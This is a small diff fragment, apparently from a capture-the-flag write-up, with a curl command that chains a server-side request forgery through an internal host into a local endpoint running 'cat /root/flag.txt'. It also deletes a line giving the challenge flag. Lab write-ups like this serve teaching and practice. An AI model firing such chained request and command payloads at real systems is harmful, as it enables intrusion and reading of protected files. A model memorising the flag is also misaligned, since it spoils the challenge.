@@ -120,4 +120,3 @@
      ```bash
      curl -i -s "http://$TARGET/load?q=http://$INTERNAL/load?q=http::////127.0.0.1:5000/runme?x=cat%2520/root/flag.txt"
      ```
-   - Flag: `HTB{55rf_2_rc3}`
